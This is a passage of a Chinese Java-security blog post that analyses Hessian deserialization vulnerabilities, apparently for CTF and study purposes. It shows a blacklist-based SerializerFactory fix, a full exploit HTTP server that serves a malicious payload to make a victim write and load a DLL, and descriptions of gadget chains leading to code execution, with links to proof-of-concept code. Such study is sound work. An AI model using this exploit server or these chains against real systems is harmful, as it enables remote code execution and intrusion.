+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772345859679-a7b65e0b-b8cb-4db8-8160-aeac53d05cbb.png"  alt="img"></p>
+<p>这里就跟HessianInput里的过程很类似了。只不过这里变成了readObject，而不是readMap，因为Hessian2里面，自定义对象不再被默认解析为Map类型。</p>
+<p>如果反序列化的是HashMap，流程会简化，如下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772346209833-ad84ed91-e2b5-48c3-8de6-d00bd52e3192.png"  alt="img"></p>
+<p>这个过程也见过好几次了。最后的利用点也是一样的</p>
+<h1 id="序列化-反序列化流程小结"><a href="#序列化-反序列化流程小结" class="headerlink" title="序列化&#x2F;反序列化流程小结"></a>序列化&#x2F;反序列化流程小结</h1><p>通过上面的分析，我们可以得出hessian反序列化的利用条件。</p>
+<p>1、入口点为hashCode，equals，compareTo</p>
+<p>2、调用链不能有transient或static修饰的变量，典例就是TemplatesImpl里的_tfactory</p>
+<p>下面来看如何修复，以及常见的链子。</p>
+<h1 id="临时修复"><a href="#临时修复" class="headerlink" title="临时修复"></a>临时修复</h1><p>这里主要通过重写SerializerFactory来添加黑名单过滤，从而阻止不安全的类进行反序列化。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Deserializer;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianProtocolException;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeSerializerFactory</span> <span class="keyword">extends</span> <span class="title class_">SerializerFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; BLACKLIST = Arrays.asList(</span><br><span class="line">            <span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>,</span><br><span class="line">            <span class="string">&quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;</span>,</span><br><span class="line">            <span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>,</span><br><span class="line">            <span class="string">&quot;org.apache.commons.collections4.functors.InstantiateTransformer&quot;</span>,</span><br><span class="line">            <span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>,</span><br><span class="line">            <span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>,</span><br><span class="line">            <span class="string">&quot;org.springframework.beans.factory.ObjectFactory&quot;</span>,</span><br><span class="line">            <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line">            <span class="string">&quot;javax.naming.InitialContext&quot;</span>,</span><br><span class="line">            <span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>,</span><br><span class="line">            <span class="string">&quot;java.net.URL&quot;</span>,</span><br><span class="line">            <span class="string">&quot;java.net.InetAddress&quot;</span>,</span><br><span class="line">            <span class="string">&quot;org.springframework.aop.framework.AdvisedSupport&quot;</span>,</span><br><span class="line">            <span class="string">&quot;java.util.ServiceLoader&quot;</span> <span class="comment">// 及其它利用链入口</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Deserializer <span class="title function_">getDeserializer</span><span class="params">(String type)</span> <span class="keyword">throws</span> HessianProtocolException &#123;</span><br><span class="line">        <span class="keyword">if</span> (type != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 简单的黑名单匹配</span></span><br><span class="line">            <span class="keyword">for</span> (String black : BLACKLIST) &#123;</span><br><span class="line">                <span class="keyword">if</span> (type.startsWith(black) || type.contains(<span class="string">&quot;TemplatesImpl&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">HessianProtocolException</span>(<span class="string">&quot;Class &quot;</span> + type + <span class="string">&quot; is blocked for security reasons.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 检查通过，调用父类逻辑</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getDeserializer(type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);</span><br><span class="line">            hessian2Input.setSerializerFactory(<span class="keyword">new</span> <span class="title class_">SafeSerializerFactory</span>());</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> hessian2Input.readObject();</span><br><span class="line">            hessian2Input.close();</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="利用链总结"><a href="#利用链总结" class="headerlink" title="利用链总结"></a>利用链总结</h1><p>这部分对原理进行简要分析，并附上利用代码。</p>
+<h2 id="HessianProxyFactory"><a href="#HessianProxyFactory" class="headerlink" title="HessianProxyFactory"></a>HessianProxyFactory</h2><p>这个利用手法来自AliyunCTF2026</p>
+<p>在高版本JDK中，JNDI的绕过很多时候依靠本地工厂类，即实现ObjectFactory的类。一般来说，是找一个连接池，进而将JNDI转化成JDBC连接，从而实现JDBC攻击。</p>
+<p>在Hessian里，也有实现了ObjectFactory的类：com.caucho.hessian.client.HessianProxyFactory。</p>
+<p>其getObjectInstance，最终会创造一个动态代理com.caucho.hessian.client.HessianProxy，这个动态代理中，可以设置一个URL。当动态代理执行任意方法时，都会先触发invoke。而invoke中，会主动向先前设置的URL请求hessian序列化数据，并经过一些判断后，调用hessian反序列化，从而触发漏洞。</p>
+<p>如图，getObjectInstance最后创建的动态代理：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772348189045-dbf0c49a-4fd2-4493-b16d-dcfcde2ccb71.png"  alt="img"></p>
+<p>如图，invoke方法中触发反序列化：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772348239438-35e1ff35-e381-4015-8863-d3e3c3cb6f97.png"  alt="img"></p>
+<p>为了利用这个漏洞，有几个条件需要满足：</p>
+<p>1、出网</p>
+<p>2、通过JNDI lookup到对象后，需要调用对象的任意方法，才能触发invoke</p>
+<p>需要自己开一个http，返回序列化数据。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.gadget.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpExchange;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpServer;</span><br><span class="line"><span class="keyword">import</span> com.test.gadget.HashMap_ProxyLazyValue;</span><br><span class="line"><span class="keyword">import</span> tools.IOTools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 利用链为写 dll/so ，然后 System.load</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HessianServer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        start(<span class="number">8076</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HttpServer</span> <span class="variable">server</span> <span class="operator">=</span> HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;0.0.0.0&quot;</span>, port), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        server.createContext(<span class="string">&quot;/hessian&quot;</span>, <span class="keyword">new</span> <span class="title class_">ExploitHandler</span>());</span><br><span class="line"></span><br><span class="line">        server.start();</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Hessian Exploit Server started on port &quot;</span> + port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            start(<span class="number">8076</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ExploitHandler</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;\n[*] Received Hessian request from victim!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取请求 (用于调试)</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> exchange.getRequestBody();</span><br><span class="line">            <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(is);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// Hessian 调用格式</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> input.readMethod();</span><br><span class="line">                System.out.println(<span class="string">&quot;    Method: &quot;</span> + method);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 读取参数 (如果有)</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">argCount</span> <span class="operator">=</span> input.readMethodArgLength();</span><br><span class="line">                System.out.println(<span class="string">&quot;    Arg count: &quot;</span> + argCount);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argCount; i++) &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">arg</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">                    System.out.println(<span class="string">&quot;    Arg[&quot;</span> + i + <span class="string">&quot;]: &quot;</span> + arg);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;    (Error reading request: &quot;</span> + e.getMessage() + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 利用链</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = IOTools.readFile(<span class="string">&quot;dynamic.dll&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;D:/1tmp/111.dll&quot;</span>;</span><br><span class="line">            <span class="type">byte</span>[] body = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                body = (<span class="type">byte</span>[]) HashMap_ProxyLazyValue.writeAndLoadLib(filename, bytes);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Sending Hessian payload...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] header = <span class="string">&quot;HabF&quot;</span>.getBytes();</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] payload = <span class="keyword">new</span> <span class="title class_">byte</span>[header.length + body.length];</span><br><span class="line"></span><br><span class="line">            System.arraycopy(header, <span class="number">0</span>, payload, <span class="number">0</span>, header.length);</span><br><span class="line">            System.arraycopy(body, <span class="number">0</span>, payload, header.length, body.length);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置响应头</span></span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, payload.length);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 返回恶意 payload</span></span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> exchange.getResponseBody();</span><br><span class="line">            os.write(payload);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Payload sent!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>题目EXP：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/CTFSolutions/tree/main/idea/2026/AliyunCTF/MHGA" >https://github.com/1diot9/CTFSolutions/tree/main/idea/2026/AliyunCTF/MHGA<i class="fas fa-external-link-alt"></i></a></p>
+<p>最后，值得一提的是，java-chains也支持生成这种通过JNDI进行利用的hessian payload的生成，只需要打开一个开关即可。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772508899042-deb7fa8d-ae36-46f1-b5bb-768575b7eeb6.png"  alt="img"></p>
+<h2 id="jdk-only"><a href="#jdk-only" class="headerlink" title="jdk-only"></a>jdk-only</h2><p>这也是CTF带出来的，记得最早出现在0CTF2022。特点是不需要其他依赖，全部使用jdk内的类。</p>
+<p>这里的关键有两个：</p>
+<p>1、最终的Sink是什么</p>
+<p>2、怎么触发Sink（各种toString触发）</p>
+<h3 id="最终Sink"><a href="#最终Sink" class="headerlink" title="最终Sink"></a>最终Sink</h3><h4 id="SwingLazyValue-createValue"><a href="#SwingLazyValue-createValue" class="headerlink" title="SwingLazyValue#createValue"></a>SwingLazyValue#createValue</h4><p>sun.swing.SwingLazyValue#createValue：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772351304277-75d9e8c8-4073-4e98-8a4e-b71c5fc59e28.png"  alt="img"></p>
+<p>能够调用任意public static method（因为最后invoke时，传入的是Class，不是具体Object）；能够调用任意public constructor</p>
+<p>注意：</p>
+<p>1、sun.swing.SwingLazyValue在jdk11以后就没了</p>
+<p>2、Class.forName时，类加载器为null，默认使用BootStrap ClassLoader，只能加载核心jar包的类，即jre&#x2F;lib下的类，如rt.jar。所以ext里的jar加载不到，比如nashorn.jar。</p>
+<p>还有一点，jvm加载核心jar是懒加载机制，即用到里面的类，才去加载相应jar，这让我想起了spring项目中的charsets.jar利用法。不过这个和本文没关系，只是顺带提一下。</p>
+<h4 id="ProxyLazyValue-createValue"><a href="#ProxyLazyValue-createValue" class="headerlink" title="ProxyLazyValue#createValue"></a>ProxyLazyValue#createValue</h4><p>javax.swing.UIDefaults.ProxyLazyValue：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772351435979-9778289b-d584-441c-9c7f-0095796cd480.png"  alt="img"></p>
+<p>同上，但在jdk11以后的版本中仍然存在，且用的是AppClassLoader，所以适用性更广。</p>
+<h3 id="真·最终Sink"><a href="#真·最终Sink" class="headerlink" title="真·最终Sink"></a>真·最终Sink</h3><p>上面只是可以触发任意public static方法或是public构造方法，但具体利用哪些方法还不知道，下面就来盘点一下。</p>
+<h4 id="ServerManagerImpl-getActiveServers"><a href="#ServerManagerImpl-getActiveServers" class="headerlink" title="ServerManagerImpl#getActiveServers"></a>ServerManagerImpl#getActiveServers</h4><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18935" >https://xz.aliyun.com/news/18935<i class="fas fa-external-link-alt"></i></a></p>
+<p>POC：<a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/blackhat2025/AudioFileFormat2toString.java" >https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/blackhat2025/AudioFileFormat2toString.java<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772351794660-b5b92513-0f0a-41a4-a944-26328c2c3d72.png"  alt="img"></p>
+<p>最终触发点：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772352198357-efa27c58-7ff4-41e6-8c22-d0282914688b.png"  alt="img"></p>
+<p>因为是通过Runtime执行的，所以执行有特殊符号的命令时，需要进行编码。</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/shadow-horse/java.lang.Runtime.exec-Payload" >https://github.com/shadow-horse/java.lang.Runtime.exec-Payload<i class="fas fa-external-link-alt"></i></a></p>
+<p>同时，这是一个getter触发点，所以可以配合getter触发，如fastjson或jackson原生反序列化。</p>
+<p>前半段使用了AudioFileFormat，后面会讲。</p>
+<h4 id="ClassPathXmlApplicationContext"><a href="#ClassPathXmlApplicationContext" class="headerlink" title="ClassPathXmlApplicationContext#"></a>ClassPathXmlApplicationContext#<init></h4><p>通过构造方法进行利用的经典案例，需要有spring-context依赖，通过加载xml利用。</p>
+<p>恶意xml可以通过java-chains生成：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772352580287-1b983961-6442-463d-9960-1d1909ad5f79.png"  alt="img"></p>
+<h4 id="JavaWrapper-main"><a href="#JavaWrapper-main" class="headerlink" title="JavaWrapper#_main"></a>JavaWrapper#_main</h4><p>POC：<a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/toStringBased/PKCS9_BCEL.java" >https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/toStringBased/PKCS9_BCEL.java<i class="fas fa-external-link-alt"></i></a></p>
+<p>前置条件，jdk&lt;8u251。</p>
+<p>通过加载BCEL码利用。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772353085232-3b9c36a8-ccb0-4196-8bce-05c1374ffaff.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772353116561-690376c4-5524-4bc2-9edc-36ac5633eb68.png"  alt="img"></p>
+<p>会反射调用自定义恶意类中的_main方法。</p>
+<p>BCEL可以通过java-chains生成：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772353257124-821d569a-0e14-4860-908b-5bf100feec46.png"  alt="img"></p>
+<h4 id="JavaUtils-writeBytesToFilename-System-load"><a href="#JavaUtils-writeBytesToFilename-System-load" class="headerlink" title="JavaUtils#writeBytesToFilename + System#load"></a>JavaUtils#writeBytesToFilename + System#load</h4><p>POC：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/HashMap_ProxyLazyValue.java" >https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/HashMap_ProxyLazyValue.java<i class="fas fa-external-link-alt"></i></a></p>
+<p>先写入dll&#x2F;so文件，然后加载。结合HashMap，能实现一次请求实现写入文件和加载dll&#x2F;so。</p>
+<h4 id="DumpBytecode-dumpBytecode"><a href="#DumpBytecode-dumpBytecode" class="headerlink" title="DumpBytecode#dumpBytecode"></a>DumpBytecode#dumpBytecode</h4><p>POC：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/toStringBased/MimeTypeParameterList_ProxyLazyValue_Sysload.java" >https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/toStringBased/MimeTypeParameterList_ProxyLazyValue_Sysload.java<i class="fas fa-external-link-alt"></i></a></p>
+<p>这是nashorn.jar的类，所以只能在jdk8，且通过ProxyLazyValue。</p>
+<h4 id="MethodUtil-invoke"><a href="#MethodUtil-invoke" class="headerlink" title="MethodUtil#invoke"></a>MethodUtil#invoke</h4><p>POC：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/toStringBased/HashTableEquals_get.java" >https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/toStringBased/HashTableEquals_get.java<i class="fas fa-external-link-alt"></i></a></p>
+<p>sun.reflect.misc.MethodUtil</p>
+<p>原本只能调用public static方法，而MethodUtil#invoke将返回扩展到了public方法。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772355335625-31153069-c169-440f-a74c-e203c79f507e.png"  alt="img"></p>
+<p>如上图，bounce是个static变量，通过getTrampoline获取：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772355373338-f92c7981-6aba-49d3-87b9-e40150a30a33.png"  alt="img"></p>
+<p>上图的getTrampolineClass，返回的是sun.reflect.misc.Trampoline，所以最后返回的Method变成 Trampoline#invoke。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772355438244-e578fe5a-bbe9-4331-80c3-9b1389bf34f8.png"  alt="img"></p>
+<p>于是最终调用到上图的invoke。</p>
+<h4 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter#"></a>TrAXFilter#<init></h4><p>这个用不了，因为最终要用TemplatesImpl，hessian无法序列化里面的transit变量。不过还是在这里提一下。</p>
+<h3 id="UIDefaults-get触发"><a href="#UIDefaults-get触发" class="headerlink" title="UIDefaults#get触发"></a>UIDefaults#get触发</h3><p>分析完上面的Sink，现在的目标是，如何调用到createValue。</p>
+<p>这里主要通过toString触发，链路大致为：</p>
+<p>xxx#toString–&gt;UIDefaults#get–&gt;SwingLazyVaule&#x2F;ProxyLazyValue#createValue。</p>
+<p>UIDefaults#get怎么触发到createValue比较清晰，所以这里主要找怎么触发get。</p>
+<p>注意：UIDefaults是HashTable的子类。</p>
+<h4 id="走toString"><a href="#走toString" class="headerlink" title="走toString"></a>走toString</h4><h5 id="sun-security-pkcs-PKCS9Attributes"><a href="#sun-security-pkcs-PKCS9Attributes" class="headerlink" title="sun.security.pkcs.PKCS9Attributes"></a>sun.security.pkcs.PKCS9Attributes</h5><p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772356121493-9f5277a4-c0cf-42a0-98ae-dda2b919090e.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772356135966-3f1aae50-93c6-408f-a428-9d43d8cb14f5.png"  alt="img"></p>
+<p>attributes可控，且是HashTable。</p>
+<h5 id="javax-activation-MimeTypeParameterList"><a href="#javax-activation-MimeTypeParameterList" class="headerlink" title="javax.activation.MimeTypeParameterList"></a>javax.activation.MimeTypeParameterList</h5><p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772356388517-8a3c7991-7ced-4299-85c9-c20ddc21f441.png"  alt="img"></p>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><h5 id="HashTable-equals"><a href="#HashTable-equals" class="headerlink" title="HashTable#equals"></a>HashTable#equals</h5><p>HashMap#putVal–&gt;HashTable#equals–&gt;UIDefaults#get</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772356490978-07971e90-df55-4aa8-8b12-7ed0b8630033.png"  alt="img"></p>
+<h3 id="toString怎么触发"><a href="#toString怎么触发" class="headerlink" title="toString怎么触发"></a>toString怎么触发</h3><p>上面有两种方法需要触发toString，现在来看看怎么样触发toString。</p>
+<h4 id="通过expect触发"><a href="#通过expect触发" class="headerlink" title="通过expect触发"></a>通过expect触发</h4><p>核心原理是，对象被当作字符串进行拼接，从而隐式调用toString。漏洞代码如下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772350361581-3b3bf4d4-5196-4af1-afd3-145f913bb1b3.png"  alt="img"></p>
+<p>调用栈如下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772350378863-ab4a568f-2f85-445d-a2f0-32be23e7836c.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772350503924-9b507c83-7985-4522-bfa1-7d7dc829a824.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772350525084-8aa110c3-7b0a-416f-a5bd-088dfd1fc0c8.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772350611819-7c0abc24-bf9f-4a55-a5eb-e5f5eecf724c.png"  alt="img"></p>
+<p>上面的图显示，当读取type（理应为字符串）失败时，会进入default抛出报错，报错时会反序列化对象，并和字符串进行拼接。</p>
+<p>为此，序列化过程需要做一些操作：</p>
